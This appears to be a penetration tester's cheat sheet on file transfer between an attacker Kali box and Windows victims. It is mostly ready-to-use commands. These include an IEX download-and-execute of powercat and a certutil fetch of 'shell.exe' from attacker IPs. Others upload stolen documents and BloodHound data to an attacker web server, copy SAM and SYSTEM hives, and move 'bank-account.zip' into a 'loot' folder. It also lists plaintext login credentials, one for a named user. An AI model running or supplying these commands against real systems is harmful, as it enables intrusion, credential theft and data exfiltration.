# Transferring Files

https://github.com/eMVee-NL/MindMap/tree/main/File-Transfer


Nothing is 100% bullet-proof. This is why I have several options to accomplish this.
1- As already mentioned, impacket-smbserver -smb2support test . is gold.
2- python -m pyftpdlib -w will spawn a ftp server on you kali. use the ftp command on windows to transfer the file(s).
3- On Kali: nc -lvp 4444 > TransferedFile on Windows: nc.exe <kali_ip> 4444 -w 5 < FileToTransfer
4- Using powercat + powershell. Host powercat.ps1(link: https://github.com/besimorhino/powercat/blob/master/powercat.ps1) in a webserver on the attacker machine. Execute powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://kali-ip/powercat.ps1');powercat -l -p 4444 -i C:\Users\test\FiletoTransfer" On kali: wget http://windows-ip:4444/FileToTransfer
5- Host the below php on a php-enabled webserver on kali:

<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>

Use a webbrowser on the victim to access the page and upload the desired file or use the below powershell to accomplish the same:

powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')

powershell (New-Object System.Net.WebClient).UploadFile('http://10.10.134.254:8888/upload.php', 'bloodhound.zip')


sudo systemctl apache2 start
sudo php -S 0.0.0.0:80
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.45.178:90/upload.php', 'bloodhound.zip')

### Powershell Linux to Windows
````
(new-object System.Net.WebClient).DownloadFile('http://192.168.119.138:8000/chisel.exe','C:\Windows\Tasks\chisel.exe')
````
### SMB Linux to Windows
````
impacket-smbserver -smb2support Share .
cmd.exe /c //<your kali IP>/Share/<file name you want>
````
````
/usr/local/bin/smbserver.py -username df -password df share . -smb2support
net use \\<your kali IP>\share /u:df df
copy \\<your kali IP>\share\<file wanted>
````
````
impacket-smbserver -smb2support Share .
net use \\<your kali IP>\share
copy \\<your kali IP>\share\whoami.exe
````
### Windows http server Linux to Windows
````
python3 -m http.server 80
certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
````
````
Invoke-WebRequest -Uri http://10.10.93.141:7781/winPEASx64.exe -OutFile wp.exe
````
#### Errors
````
Access is denied. In this case try Invoke-WebRequest for powershell
````
### SMB Shares Windows to Windows
````
In this situation we have logged onto computer A
sudo impacket-psexec Admin:'password123'@192.168.203.141 cmd.exe
C:\Windows\system32> ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.203.141
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.203.254

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.93.141
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
   
 Via Computer A we pivot to Computer B (internal IP) with these creds
 proxychains evil-winrm -u celia.almeda -p 7k8XHk3dMtmpnC7 -i 10.10.93.142
````
#### Accessing $C Drive of Computer A
````
*Evil-WinRM* PS C:\windows.old\Windows\system32> net use * \\10.10.93.141\C$ /user:Admin password123
````
#### Copying over files
````
*Evil-WinRM* PS C:\windows.old\Windows\system32> xcopy C:\windows.old\Windows\system32\SYSTEM Z:\
*Evil-WinRM* PS C:\windows.old\Windows\system32> xcopy C:\windows.old\Windows\system32\SAM Z:\
````
### SMB Server Bi-directional
````
impacket-smbserver -smb2support Share .
smbserver.py -smb2support Share .
mkdir loot #transfering loot to this folder
net use * \\192.168.119.183\share
copy Z:\<file you want from kali>
copy C:\bank-account.zip Z:\loot #Transfer files to the loot folder on your kali machine
````
#### Authenticated
````
You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
````
````
impacket-smbserver -username df -password df share . -smb2support
net use \\10.10.16.9\share /u:df df
copy \\10.10.16.9\share\<file wanted>
````

### PHP Script Windows to Linux
````
cat upload.php
chmod +x upload.php
````
````
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
````
````
sudo mkdir /var/www/uploads
````
````
mv upload.php /var/www/uploads
````
````
service apache2 start
ps -ef | grep apache
`````
````
powershell -c "(New-Object System.Net.WebClient).UploadFile('http://10.10.134.254:9999/upload.php', '.\dc_20240822153055_BloodHound.zip')"
````
````
service apache2 stop
````
